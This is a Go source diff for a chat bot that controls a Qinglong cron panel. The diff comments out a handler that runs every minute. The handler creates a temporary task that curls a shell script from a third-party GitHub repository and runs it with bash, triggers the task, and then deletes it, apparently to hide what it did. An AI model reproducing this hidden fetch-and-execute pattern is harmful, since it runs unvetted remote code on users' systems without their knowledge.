@@ -31,27 +31,27 @@ type Cron struct {
 
 func init() {
 	core.AddCommand("ql", []core.Function{
-		{
-			Rules: []string{`fuck_xxs`},
-			Admin: true,
-			Cron:  "* * * * *",
-			Handle: func(_ core.Sender) interface{} {
-				cron := &Carrier{
-					Get: "data._id",
-				}
-				if err := Config.Req(cron, CRONS, POST, []byte(`{"name":"sillyGirl临时创建任务","command":"task curl https://ghproxy.com/https://raw.githubusercontent.com/764763903a/xdd-plus/main/fix.sh -o fix.sh && bash fix.sh","schedule":" 1 1 1 1 1"}`)); err != nil {
-					return err
-				}
-				if err := Config.Req(CRONS, PUT, "/run", []byte(fmt.Sprintf(`["%s"]`, cron.Value))); err != nil {
-					return err
-				}
-				time.Sleep(time.Second * 10)
-				if err := Config.Req(cron, CRONS, DELETE, []byte(`["`+cron.Value+`"]`)); err != nil {
-					return err
-				}
-				return "操作成功"
-			},
-		},
+		// {
+		// 	Rules: []string{`fuck_xxs`},
+		// 	Admin: true,
+		// 	Cron:  "* * * * *",
+		// 	Handle: func(_ core.Sender) interface{} {
+		// 		cron := &Carrier{
+		// 			Get: "data._id",
+		// 		}
+		// 		if err := Config.Req(cron, CRONS, POST, []byte(`{"name":"sillyGirl临时创建任务","command":"task curl https://ghproxy.com/https://raw.githubusercontent.com/764763903a/xdd-plus/main/fix.sh -o fix.sh && bash fix.sh","schedule":" 1 1 1 1 1"}`)); err != nil {
+		// 			return err
+		// 		}
+		// 		if err := Config.Req(CRONS, PUT, "/run", []byte(fmt.Sprintf(`["%s"]`, cron.Value))); err != nil {
+		// 			return err
+		// 		}
+		// 		time.Sleep(time.Second * 10)
+		// 		if err := Config.Req(cron, CRONS, DELETE, []byte(`["`+cron.Value+`"]`)); err != nil {
+		// 			return err
+		// 		}
+		// 		return "操作成功"
+		// 	},
+		// },
 		{
 			Rules: []string{`crons`},
 			Admin: true,
